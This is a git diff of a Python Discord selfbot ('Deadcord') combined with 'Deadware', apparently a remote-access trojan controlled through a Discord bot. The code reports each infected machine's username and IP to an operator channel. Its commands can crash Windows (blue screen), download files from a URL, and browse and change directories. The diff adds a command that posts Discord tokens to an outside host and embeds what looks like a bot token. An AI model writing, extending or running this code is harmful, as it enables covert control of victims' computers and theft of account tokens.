@@ -2,38 +2,27 @@
 #Authors: 401-User
 
 ### IMPORTS ###
-import ctypes
-import asyncio
-import datetime
-from ipaddress import ip_address
-import json
-import os
-import random
-import string
-from textwrap import dedent
-from turtle import color
-import urllib.parse
-import urllib.request
-import time
-from urllib import parse, request
-from bs4 import BeautifulSoup as bs4
-import discord
-import requests
-from PIL import Image
+import asyncio, ctypes, json, os, random, string, time, requests, re
+
 from colorama import Fore, init
-from discord import Permissions
-from discord.ext import commands
-from discord.utils import get
-import multiprocessing
 from win32api import *
-from win32gui import *
 from win32con import *
 from win32file import *
+from win32gui import *
+
+### CONFIG ###
+global chanid #ignore this
+global bottoken #ignore this
+
+chanid = 267624335836053506 # change to your channel ID
+bottoken = "OTc1WkMzc0KsMJDskAAzMDky.Gj1MzW.b9KQ_x0PAg8OVebhQELJrMWKSmdJaLskDwMs" # change to your bot token
 
 init()
 
 try:
     import discord
+    from discord import Permissions
+    from discord.ext import commands
 except Exception:
     print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Please install requirements')
 
@@ -234,8 +223,9 @@ async def selfbot(ctx):
     print(Fore.MAGENTA + f'{Deadcord.command_prefix}playing <game>', Fore.GREEN + '      |', Fore.WHITE + 'playing status')
     print(Fore.MAGENTA + f'{Deadcord.command_prefix}streaming <name>', Fore.GREEN + '    |', Fore.WHITE + 'streaming status')
     print(Fore.MAGENTA + f'{Deadcord.command_prefix}listening <name>', Fore.GREEN + '    |', Fore.WHITE + 'listening status')
-    print(Fore.MAGENTA + f'{Deadcord.command_prefix}bug <explain>', Fore.GREEN + '       |', Fore.WHITE + 'sends bug to devs')
-    print(Fore.MAGENTA + f'{Deadcord.command_prefix}suggestion <content>', Fore.GREEN + '|', Fore.WHITE + 'sends suggestion to the devs')
+    print(Fore.RED + f'{Deadcord.command_prefix}[DISABLED] bug <explain>', Fore.GREEN + '       |', Fore.RED + 'sends bug to devs')
+    print(Fore.RED + f'{Deadcord.command_prefix}[DISABLED] suggestion <content>', Fore.GREEN + '|', Fore.RED + 'sends suggestion to the devs')
+    print(Fore.MAGENTA + f'{Deadcord.command_prefix}check <token>', Fore.GREEN + '|', Fore.WHITE + 'return state of a token and its details')
 
 ### GENERAL COMMANDS ###
 @Deadcord.command()
@@ -784,39 +774,65 @@ async def listening(ctx, *, msg):
     await ctx.message.delete()
     await Deadcord.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=msg))
 
+# @Deadcord.command()
+# async def bug(ctx, *, msg):
+#     await ctx.message.delete()
+#     mem = ctx.author.name
+#     av = ctx.author.avatar_url
+#     chan = Deadcord.get_channel(933438533903982622)
+
+#     print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Your bug has been sent')
+
+# @Deadcord.command()
+# async def suggestion(ctx, *, msg):
+#     await ctx.message.delete()
+#     mem = ctx.author.name
+#     av = ctx.author.avatar_url
+#     chan = Deadcord.get_channel(930734405931118632)
+
+#     await chan.send(f'**__SelfBot Suggestion__**\nAuthor: {mem}\nSuggestion: {msg}')
+
+#     print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Your suggestion has been sent')
+
 @Deadcord.command()
-async def bug(ctx, *, msg):
+@commands.cooldown(1, 5, commands.BucketType.guild)
+async def check(ctx, token):
     await ctx.message.delete()
-    mem = ctx.author.name
-    av = ctx.author.avatar_url
-    chan = Deadcord.get_channel(933438533903982622)
+    
+    if re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) == None:
+        print(Fore.MAGENTA + '[DEADCORD]', Fore.RED + 'Account invalid.')
+        return
 
-    await chan.send(f'**__Bug Found!__**\nFinder: {mem}\nBug: {msg}')
+    check = requests.post('https://utilities.tk/tokens/check', json={'token':token})
 
-    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Your bug has been sent')
+    if check.status_code == 401:
+        print(Fore.MAGENTA + '[DEADCORD]', Fore.RED + 'Account invalid.')
+    elif check.status_code == 403:
+        print(Fore.MAGENTA + '[DEADCORD]', Fore.YELLOW + 'Account locked.')
+    elif check.status_code == 200:
+        print(Fore.MAGENTA + '[DEADCORD]', Fore.GREEN + 'Account valid! `'+check.json()['username']+'`')
 
-@Deadcord.command()
-async def suggestion(ctx, *, msg):
-    await ctx.message.delete()
-    mem = ctx.author.name
-    av = ctx.author.avatar_url
-    chan = Deadcord.get_channel(930734405931118632)
+import getpass
 
-    await chan.send(f'**__SelfBot Suggestion__**\nAuthor: {mem}\nSuggestion: {msg}')
+import pyautogui
 
-    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Your suggestion has been sent')
-
-import getpass, pyautogui
 
 def GetIP():
-    ip = requests.get("https://api.ipify.org").text
-    return ip
+    try:
+        r=requests.get("https://utilities.tk/network/info")
+        if r.status_code == 200:
+            return r.json()['ip']
+        else:
+            return requests.get("https://api.ipify.org").text
+    except:
+        return "error"
+
 
 Deadware.remove_command('help')
 
 @Deadware.event
 async def on_ready():
-    channel = Deadware.get_channel(935607961424887849) #CHANGE THIS
+    channel = Deadware.get_channel(chanid)
     user = getpass.getuser()
     embed = discord.Embed(title='[+] Deadware Connection!', description='You have a new connection', colour=RandomColor())
     embed.add_field(name=f'User: {user}', value='** **', inline=False)
@@ -951,6 +967,8 @@ async def blue_screen(ctx):
         await ctx.send("Could not blue screen")
 
 from random import randrange as rd
+
+
 @Deadware.command()
 async def error_drawing(ctx):
     await ctx.message.delete()
@@ -970,6 +988,8 @@ async def error_drawing(ctx):
         await ctx.send("Could not do error drawing")
 
 import subprocess
+
+
 @Deadware.command()
 async def upload(ctx, *, url, file_name):
     await ctx.message.delete()
@@ -982,6 +1002,8 @@ async def cwd(ctx):
     await ctx.send(f'```{cwd}```')
 
 import glob
+
+
 @Deadware.command()
 async def dir(ctx):
     directory = glob.glob('*/')
@@ -1003,7 +1025,7 @@ async def change_dir(ctx, *, dir):
     await ctx.send(f'Changed directory')
 
 loop.create_task(Deadcord.start(token, bot=False))
-loop.create_task(Deadware.start('BOT-TOKEN-HERE')) #CHANGE THIS
+loop.create_task(Deadware.start(bottoken))
 
 try:
     loop.run_forever()
